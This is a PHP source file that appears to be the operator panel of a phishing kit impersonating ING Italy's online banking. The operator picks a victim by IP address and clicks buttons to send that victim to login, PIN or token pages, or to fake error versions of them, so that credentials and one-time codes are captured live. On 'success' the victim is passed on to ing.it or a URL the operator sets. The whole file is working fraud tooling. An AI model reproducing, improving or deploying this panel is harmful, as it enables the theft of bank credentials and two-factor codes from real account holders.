<?php

require_once "../config.php";

$ip = $_GET['id_user'];

$jsonFilename = __DIR__ . '/logs/' . str_replace('.', '-', $ip) . '.json';
$json = file_exists($jsonFilename) ? json_decode(file_get_contents($jsonFilename), true) : [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newStatus = $_POST['status'] ?? null;
    
    if (isset($newStatus) && file_exists($jsonFilename)) {
        $json = json_decode(file_get_contents($jsonFilename), true);
        $json['status'] = $newStatus;
        
        $statusRedirects = [
            'error-login' => 'login.php',
            'pin' => 'pin.php',
            'error-pin' => 'pin.php',
            'token' => 'token.php',
            'error-token' => 'token.php',
            'success' => $json['redirect_url'] ?? 'https://www.ing.it/'
        ];
        
        if (isset($statusRedirects[$newStatus])) {
            $json['redirect_to'] = $statusRedirects[$newStatus];
        }
        
        file_put_contents($jsonFilename, json_encode($json, JSON_PRETTY_PRINT));
        $msg = "Status updated to $newStatus";
    }
    
    $newRedirectUrl = $_POST['redirect_url'] ?? null;
    if (isset($newRedirectUrl) && $newRedirectUrl !== '' && file_exists($jsonFilename)) {
        $json = json_decode(file_get_contents($jsonFilename), true);
        $json['redirect_url'] = $newRedirectUrl;
        file_put_contents($jsonFilename, json_encode($json, JSON_PRETTY_PRINT));
        $msg = "Redirect URL updated";
    }
}
?>

<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/panel.css">
        <!-- Font Awesome Library -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
            integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
            crossorigin="anonymous" referrerpolicy="no-referrer" />
        <!-- JQ -->
        <script src="../js/jquery-3.6.0.min.js"></script>
        <!-- Favicon -->
        <link rel="icon" href="img/favicon.png">
        <link rel="shortcut" href="img/favicon.png">
        <link rel="appel-touch-icon" href="img/favicon.png">
        <title>Dashboard Control User - <?php echo $_GET['id_user'];?></title>
    </head>

    <body id="beforeUserData" class="">
        <!-- Start Nav Bar  here-->
        <nav>
            <div class="content-nav">
                <h3><img src="img/favicon.png" alt=""> Admin Dashboard</h3>

                <!-- Show $msg here -->

            </div>
        </nav>
        <!-- End Nav Bar -->

        <!-- Start Buttons Control Users -->
        <div class="container-buttons-control-user">
            <div class="container">
                <br>
                <center>
                    <div style="color: #fff; font-size: 20px; font-weight: bold"><?php echo isset($msg) ? $msg : ''; ?>
                    </div>
                </center>
                <br>
                <form method="POST">
                    <div class="form-group mb-3">
                        <label style="color: #fff;">Redirect URL:</label>
                        <input type="text" name="redirect_url" class="form-control" 
                            value="<?php echo isset($json['redirect_url']) ? htmlspecialchars($json['redirect_url']) : ''; ?>" 
                            placeholder="https://example.com">
                        <button type="submit" class="btn btn-sm btn-primary mt-2">Save URL</button>
                    </div>
                    <hr style="border-color: #444;">
                    <button type="submit" name="status" class="buttons-control-users button-error"
                        value="error-login">Error
                        Login</button>

                    <button type="submit" name="status" class="buttons-control-users button-valid" value="pin">PIN
                    </button>
                    <button type="submit" name="status" class="buttons-control-users button-error"
                        value="error-pin">Error PIN</button>
                    <div>
                        <button type="submit" name="status" class="buttons-control-users button-valid"
                            value="token">TOKEN
                        </button>
                        <button type="submit" name="status" class="buttons-control-users button-error"
                            value="error-token">Error TOKEN</button>
                        <button type="submit" name="status" class="buttons-control-users button-comfirmed"
                            value="success">Success</button>
                    </div>
                </form>

            </div>
        </div>
    </body>

</html>